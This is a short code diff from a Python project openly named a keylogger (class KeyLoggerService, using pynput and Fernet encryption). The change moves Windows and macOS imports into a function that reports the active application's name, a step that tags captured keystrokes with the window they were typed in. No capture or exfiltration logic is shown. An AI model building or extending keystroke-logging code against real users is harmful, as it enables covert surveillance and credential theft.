@@ -6,8 +6,6 @@ from pynput import keyboard
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 import platform
-# import win32gui # Windowsttt
-from AppKit import NSWorkspace # macOS
 
 
 class KeyLoggerService:
@@ -48,10 +46,11 @@ class KeyLoggerService:
     @staticmethod
     def get_active_application():
         # if platform.system() == "Windows": # Windows
+        #     import win32gui # Windows
         #     hwnd = win32gui.GetForegroundWindow() # Windows
         #     return win32gui.GetWindowText(hwnd) or "Unknown" # Windows
-
         if platform.system() == "Darwin": # macOS
+            from AppKit import NSWorkspace  # macOS
             active_app = NSWorkspace.sharedWorkspace().activeApplication() # macOS
             return active_app.get("NSApplicationName", "Unknown") # macOS
         return "Unsupported"
